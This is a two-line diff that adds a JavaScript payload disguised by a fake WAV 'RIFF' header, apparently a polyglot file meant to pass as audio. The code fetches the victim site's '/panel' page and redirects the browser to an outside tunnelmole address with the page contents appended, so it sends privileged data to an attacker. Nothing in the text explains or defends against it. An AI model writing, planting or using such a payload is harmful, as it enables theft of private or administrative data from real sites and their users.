@@ -1,0 +1,2 @@
+//RIFF::::WAVE
+fetch('/panel').then(e=>e.text()).then(e=>{window.location.href='http://9irwnr-ip-103-242-105-157.tunnelmole.com/hai?get='+e;})
